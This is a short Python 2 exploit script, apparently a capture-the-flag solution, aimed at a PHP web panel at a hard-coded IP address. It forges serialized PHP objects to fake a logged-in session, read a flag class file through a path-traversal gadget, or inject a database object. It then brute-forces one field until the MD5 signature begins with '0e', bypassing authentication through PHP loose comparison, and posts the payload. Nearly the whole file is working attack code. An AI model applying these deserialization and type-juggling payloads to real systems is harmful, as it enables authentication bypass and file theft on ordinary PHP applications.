import requests, base64, hashlib

#basic
#OBJ = 'a:4:{s:6:"logged";b:1;s:5:"title";s:3:"mr.";s:8:"username";s:15:"ultraS3cur3Us3r";s:4:"asdf";i:1337;}'
username = 'testuser'
OBJ = 'a:6:{s:2:"id";i:1;s:5:"title";s:3:"mr.";s:8:"username";s:'+str(len(username))+':"'+username+'";s:8:"password";s:32:"8dbdda48fb8748d6746f1965824e966a";s:6:"logged";b:1;s:4:"asdf";i:1337;}'
# file
#f = "../classes/fl4giSher3.class.php"
#OBJ = 'a:4:{s:6:"logged";b:1;s:5:"title";s:3:"mr.";s:8:"username";O:7:"logFile":2:{s:18:"\x00logFile\x00__logName";s:'+str(len(f))+':"'+f+'";s:10:"\x00*\x00_method";s:7:"readLog";}s:4:"asdf";i:1337;}'

# db
#OBJ = base64.b64decode('YTo0OntzOjY6ImxvZ2dlZCI7YjoxO3M6NToidGl0bGUiO3M6MzoibXIuIjtzOjg6InVzZXJuYW1lIjtPOjU6ImxvZ0RCIjozOntzOjExOiIAbG9nREIAX19kYiI7Tzo4OiJNeXNxbGlEYiI6Mzg6e3M6MTA6IgAqAF9teXNxbGkiO047czo5OiIAKgBfcXVlcnkiO047czoxMzoiACoAX2xhc3RRdWVyeSI7TjtzOjE2OiIAKgBfcXVlcnlPcHRpb25zIjthOjA6e31zOjg6IgAqAF9qb2luIjthOjA6e31zOjk6IgAqAF93aGVyZSI7YTowOnt9czoxMToiACoAX2pvaW5BbmQiO2E6MDp7fXM6MTA6IgAqAF9oYXZpbmciO2E6MDp7fXM6MTE6IgAqAF9vcmRlckJ5IjthOjA6e31zOjExOiIAKgBfZ3JvdXBCeSI7YTowOnt9czoxNDoiACoAX3RhYmxlTG9ja3MiO2E6MDp7fXM6MTk6IgAqAF90YWJsZUxvY2tNZXRob2QiO3M6NDoiUkVBRCI7czoxNDoiACoAX2JpbmRQYXJhbXMiO2E6MTp7aTowO3M6MDoiIjt9czo1OiJjb3VudCI7aTowO3M6MTA6InRvdGFsQ291bnQiO2k6MDtzOjEzOiIAKgBfc3RtdEVycm9yIjtOO3M6MTM6IgAqAF9zdG10RXJybm8iO047czo3OiIAKgBob3N0IjtzOjk6ImxvY2FsaG9zdCI7czoxMjoiACoAX3VzZXJuYW1lIjtzOjQ6InVzZXIiO3M6MTI6IgAqAF9wYXNzd29yZCI7czo4OiJwYXNzd29yZCI7czo1OiIAKgBkYiI7czoxMjoidWx0cmFTZWN1cmVkIjtzOjc6IgAqAHBvcnQiO047czoxMDoiACoAY2hhcnNldCI7czo0OiJ1dGY4IjtzOjEzOiIAKgBpc1N1YlF1ZXJ5IjtiOjA7czoxNjoiACoAX2xhc3RJbnNlcnRJZCI7TjtzOjE3OiIAKgBfdXBkYXRlQ29sdW1ucyI7TjtzOjEwOiJyZXR1cm5UeXBlIjtzOjU6ImFycmF5IjtzOjEyOiIAKgBfbmVzdEpvaW4iO2I6MDtzOjIwOiIATXlzcWxpRGIAX3RhYmxlTmFtZSI7czowOiIiO3M6MTM6IgAqAF9mb3JVcGRhdGUiO2I6MDtzOjE5OiIAKgBfbG9ja0luU2hhcmVNb2RlIjtiOjA7czoxMDoiACoAX21hcEtleSI7TjtzOjE0OiIAKgB0cmFjZVN0YXJ0USI7TjtzOjE1OiIAKgB0cmFjZUVuYWJsZWQiO047czoxOToiACoAdHJhY2VTdHJpcFByZWZpeCI7TjtzOjU6InRyYWNlIjthOjA6e31zOjk6InBhZ2VMaW1pdCI7aToyMDtzOjEwOiJ0b3RhbFBhZ2VzIjtpOjA7fXM6MTE6IgBsb2dEQgBfX0lEIjtzOjQ6IjEzOTYiO3M6MTA6IgAqAF9tZXRob2QiO3M6NzoicmVhZExvZyI7fXM6NDoiYXNkZiI7aToxMzM3O30=')

URL = "http://46.101.96.182/panel/contact?auth={}0e000000000000000000000000000000"

db_id = "1396"

OBJ = OBJ.replace('__ID";s:4:"1396"', '__ID";s:{}:"{}"'.format(len(str(db_id)), str(db_id)))


for i in range(10000):
    o = OBJ.replace('1337', str(i))
    md5 = hashlib.md5(o + 'THEKEYISHEREWOW!').hexdigest()
    if md5[:2] == "0e" and md5[2:6].isdigit():
        u = URL.format(base64.b64encode(o))
        print o,md5,u
        break

msg = """"""
r = requests.post(u, data={'contactUs': 1, 'message': msg})
print r.text